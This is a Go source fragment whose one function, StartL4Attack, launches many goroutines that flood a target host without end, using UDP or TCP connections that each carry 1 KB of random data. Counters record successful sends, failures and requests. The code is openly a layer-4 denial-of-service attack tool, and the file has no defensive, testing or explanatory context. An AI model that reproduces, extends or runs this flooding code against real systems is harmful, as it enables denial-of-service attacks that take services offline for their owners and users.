package main

import (
	"math/rand"
	"net"
	"sync/atomic"
	"time"
)

func StartL4Attack(target string, method string, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			payload := make([]byte, 1024)
			rand.Read(payload)

			for {
				if method == "UDP" {
					conn, err := net.Dial("udp", target)
					if err == nil {
						conn.Write(payload)
						atomic.AddUint64(&success, 1)
						conn.Close()
					} else {
						atomic.AddUint64(&fails, 1)
					}
				} else if method == "TCP" {
					conn, err := net.DialTimeout("tcp", target, 2*time.Second)
					if err == nil {
						conn.Write(payload)
						atomic.AddUint64(&success, 1)
						conn.Close()
					} else {
						atomic.AddUint64(&fails, 1)
					}
				}
				atomic.AddUint64(&reqSent, 1)
			}
		}()
	}
}
